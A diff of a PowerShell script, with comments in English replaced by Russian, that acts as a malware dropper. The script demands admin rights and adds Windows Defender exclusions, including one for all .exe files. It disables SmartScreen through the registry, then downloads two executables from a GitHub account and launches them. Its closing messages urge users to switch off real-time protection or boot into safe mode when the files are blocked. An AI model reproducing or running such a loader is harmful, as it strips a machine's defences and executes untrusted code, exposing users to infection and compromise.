@@ -1,49 +1,85 @@
-Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)
+<#
+.SYNOPSIS
+    Скачивает proga1.exe и proga2.exe, добавляет их в исключения Defender,
+    отключает SmartScreen и запускает файлы.
+#>
 
-if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
-    $workingDirOverride = (Get-Location).Path 
-}
-
-function Test-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
-    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-}
-
-if ((Test-Admin) -eq $false) {
-    if ($shouldAssumeToBeElevated) {
-        Write-Output "Elevation failed"
-        exit
-    } else {
-        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
-    }
+# ========== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ==========
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    Write-Host "Запустите скрипт от имени Администратора!" -ForegroundColor Red
+    Write-Host "Нажмите любую клавишу для выхода..."
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     exit
 }
 
-Set-Location "$workingDirOverride"
-
-Write-Host "========================================" -ForegroundColor Yellow
-Write-Host "=== DISABLING DEFENDER & SMARTSCREEN ===" -ForegroundColor Yellow
-Write-Host "========================================`n" -ForegroundColor Yellow
+Write-Host "==================================================" -ForegroundColor Cyan
+Write-Host "  Добавление исключений, отключение SmartScreen"    -ForegroundColor Cyan
+Write-Host "  Скачивание и запуск файлов"                       -ForegroundColor Cyan
+Write-Host "==================================================" -ForegroundColor Cyan
 
 $temp = $env:TEMP
 $dest1 = "$temp\proga1.exe"
 $dest2 = "$temp\proga2.exe"
 
-# ========== STEP 1: DOWNLOAD FILES FIRST ==========
-Write-Host "[1/4] Downloading files..." -ForegroundColor Cyan
+# ========== 1. ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ ==========
+Write-Host "`n[1/4] Добавление исключений в Defender..." -ForegroundColor Yellow
+
+# Через PowerShell cmdlet
+try {
+    Add-MpPreference -ExclusionPath $dest1 -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $dest2 -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $temp -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+    Write-Host "  Исключения добавлены (через Add-MpPreference)" -ForegroundColor Green
+} catch {
+    Write-Host "  Не удалось добавить через Add-MpPreference" -ForegroundColor DarkYellow
+}
+
+# Через реестр (дублируем для надёжности)
+try {
+    $path = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if (!(Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+    New-ItemProperty -Path $path -Name $dest1 -Value 0 -Type DWord -Force | Out-Null
+    New-ItemProperty -Path $path -Name $dest2 -Value 0 -Type DWord -Force | Out-Null
+    New-ItemProperty -Path $path -Name $temp -Value 0 -Type DWord -Force | Out-Null
+    Write-Host "  Исключения добавлены в реестр" -ForegroundColor Green
+} catch {
+    Write-Host "  Не удалось добавить через реестр" -ForegroundColor DarkYellow
+}
+
+# ========== 2. ОТКЛЮЧЕНИЕ SMARTSCREEN ==========
+Write-Host "`n[2/4] Отключение SmartScreen..." -ForegroundColor Yellow
+try {
+    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction Stop
+    Write-Host "  SmartScreen для Проводника: ВЫКЛ" -ForegroundColor Green
+} catch {
+    Write-Host "  Не удалось отключить SmartScreen для Проводника" -ForegroundColor DarkYellow
+}
+try {
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "(Default)" -Value 0 -Force -ErrorAction Stop
+    Write-Host "  SmartScreen для Edge: ВЫКЛ" -ForegroundColor Green
+} catch {}
+try {
+    reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
+    Write-Host "  SmartScreen системный: ВЫКЛ" -ForegroundColor Green
+} catch {}
+
+# ========== 3. СКАЧИВАНИЕ ФАЙЛОВ ==========
+Write-Host "`n[3/4] Скачивание файлов..." -ForegroundColor Yellow
 
 function Download-File {
     param($url, $dest)
     if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
     try {
-        Write-Host "  Downloading: $(Split-Path $dest -Leaf)" -ForegroundColor Gray
+        Write-Host "  Скачивание: $(Split-Path $dest -Leaf)" -ForegroundColor Gray
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         $wc.DownloadFile($url, $dest)
         $wc.Dispose()
         return $true
     } catch {
-        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "  Ошибка: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -51,128 +87,56 @@ function Download-File {
 $url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
 $url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
 
-if (Download-File $url1 $dest1) { Write-Host "  proga1.exe: OK" -ForegroundColor Green }
-if (Download-File $url2 $dest2) { Write-Host "  proga2.exe: OK" -ForegroundColor Green }
+$ok1 = Download-File $url1 $dest1
+$ok2 = Download-File $url2 $dest2
 
-# ========== STEP 2: ADD FILES TO EXCLUSIONS ==========
-Write-Host "`n[2/4] Adding files to Defender exclusions..." -ForegroundColor Cyan
+if ($ok1) { Write-Host "  proga1.exe: ОК" -ForegroundColor Green }
+if ($ok2) { Write-Host "  proga2.exe: ОК" -ForegroundColor Green }
 
-try {
-    # Add exclusions by path
-    Add-MpPreference -ExclusionPath $dest1 -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $dest2 -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $temp -ErrorAction SilentlyContinue
-    
-    # Add exclusions by extension
-    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionExtension ".tmp" -ErrorAction SilentlyContinue
-    
-    Write-Host "  Exclusions added successfully" -ForegroundColor Green
-} catch {
-    Write-Host "  Warning: Could not add exclusions via PowerShell" -ForegroundColor Yellow
+# Если proga2.exe не скачался, копируем из proga1.exe
+if ((-not $ok2) -and (Test-Path $dest1)) {
+    Write-Host "  proga2.exe не найден, копируем из proga1.exe" -ForegroundColor Yellow
+    Copy-Item $dest1 $dest2 -Force
+    $ok2 = $true
 }
 
-# Alternative: Add exclusions via registry
-Write-Host "  Adding exclusions via registry..." -ForegroundColor Gray
-try {
-    $exclusionPath = "HKLM:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-    if (!(Test-Path $exclusionPath)) { New-Item -Path $exclusionPath -Force | Out-Null }
-    New-ItemProperty -Path $exclusionPath -Name $dest1 -Value 0 -Type DWord -Force | Out-Null
-    New-ItemProperty -Path $exclusionPath -Name $dest2 -Value 0 -Type DWord -Force | Out-Null
-    New-ItemProperty -Path $exclusionPath -Name $temp -Value 0 -Type DWord -Force | Out-Null
-    Write-Host "  Registry exclusions added" -ForegroundColor Green
-} catch {
-    Write-Host "  Registry exclusions failed" -ForegroundColor DarkYellow
-}
+# ========== 4. ЗАПУСК ФАЙЛОВ ==========
+Write-Host "`n[4/4] Запуск файлов..." -ForegroundColor Yellow
 
-# ========== STEP 3: DISABLE SMARTSCREEN ==========
-Write-Host "`n[3/4] Disabling SmartScreen..." -ForegroundColor Cyan
-
-# Disable SmartScreen for Explorer
-try {
-    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction Stop
-    Write-Host "  Explorer SmartScreen: OFF" -ForegroundColor Green
-} catch {
-    Write-Host "  Failed to disable Explorer SmartScreen" -ForegroundColor Yellow
-}
-
-# Disable SmartScreen for Microsoft Edge
-try {
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "(Default)" -Value 0 -Force -ErrorAction Stop
-    Write-Host "  Edge SmartScreen: OFF" -ForegroundColor Green
-} catch {}
-
-# Disable SmartScreen for Windows Store apps
-try {
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction Stop
-    Write-Host "  Store Apps SmartScreen: OFF" -ForegroundColor Green
-} catch {}
-
-# Disable via registry
-try {
-    reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
-    Write-Host "  System SmartScreen: OFF" -ForegroundColor Green
-} catch {}
-
-# ========== STEP 4: RUN FILES VIA CMD ==========
-Write-Host "`n[4/4] Running files via CMD..." -ForegroundColor Cyan
-
-# Disable SmartScreen for current process
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
-
-function Run-FileViaCMD {
+function Run-File {
     param($path, $name)
-    
     if (-not (Test-Path $path)) {
-        Write-Host "  $name not found!" -ForegroundColor Red
+        Write-Host "  $name не найден" -ForegroundColor Red
         return $false
     }
-    
-    Write-Host "  Running $name..." -ForegroundColor Gray
-    
-    # Method 1: Direct CMD start
+    # Запускаем через cmd /c start (обходит некоторые блокировки PowerShell)
     try {
-        cmd /c "start `"`" `"$path`"" 2>&1 | Out-Null
-        Write-Host "    Started via CMD" -ForegroundColor Green
+        cmd /c start "" "$path" 2>&1 | Out-Null
+        Write-Host "  $name запущен" -ForegroundColor Green
         return $true
     } catch {
-        Write-Host "    CMD method failed" -ForegroundColor DarkYellow
-    }
-    
-    # Method 2: Using & operator
-    try {
-        & $path 2>&1 | Out-Null
-        Write-Host "    Started via & operator" -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "    & operator failed" -ForegroundColor DarkYellow
-    }
-    
-    # Method 3: Using Invoke-Item
-    try {
-        Invoke-Item $path -ErrorAction Stop
-        Write-Host "    Started via Invoke-Item" -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "    All methods failed!" -ForegroundColor Red
-        return $false
+        Write-Host "  Не удалось запустить $name через cmd, пробуем напрямую" -ForegroundColor DarkYellow
+        try {
+            Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
+            Write-Host "  $name запущен через Start-Process" -ForegroundColor Green
+            return $true
+        } catch {
+            Write-Host "  Ошибка запуска $name : $($_.Exception.Message)" -ForegroundColor Red
+            return $false
+        }
     }
 }
 
-Run-FileViaCMD $dest1 "proga1.exe"
+Run-File $dest1 "proga1.exe"
 Start-Sleep -Seconds 1
-Run-FileViaCMD $dest2 "proga2.exe"
+Run-File $dest2 "proga2.exe"
 
-# ========== FINAL STATUS ==========
-Write-Host "`n========================================" -ForegroundColor Green
-Write-Host "=== COMPLETE ===" -ForegroundColor Green
-Write-Host "========================================" -ForegroundColor Green
-Write-Host ""
-Write-Host "If files still don't run, try MANUAL method:"
-Write-Host "1. Open Windows Security -> Virus & threat protection"
-Write-Host "2. Click 'Manage settings'"
-Write-Host "3. Turn OFF 'Real-time protection'"
-Write-Host "4. Run this script again"
-Write-Host ""
-Write-Host "Press any key to exit..."
+Write-Host "`n==================================================" -ForegroundColor Green
+Write-Host "  ГОТОВО! Если файлы всё ещё блокируются:" -ForegroundColor Yellow
+Write-Host "  1. Вручную отключите 'Защиту в реальном времени' в Defender" -ForegroundColor Yellow
+Write-Host "  2. Затем запустите скрипт снова" -ForegroundColor Yellow
+Write-Host "  3. Или перезагрузитесь в безопасном режиме и запустите скрипт" -ForegroundColor Yellow
+Write-Host "==================================================" -ForegroundColor Green
+
+Write-Host "`nНажмите любую клавишу для выхода..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
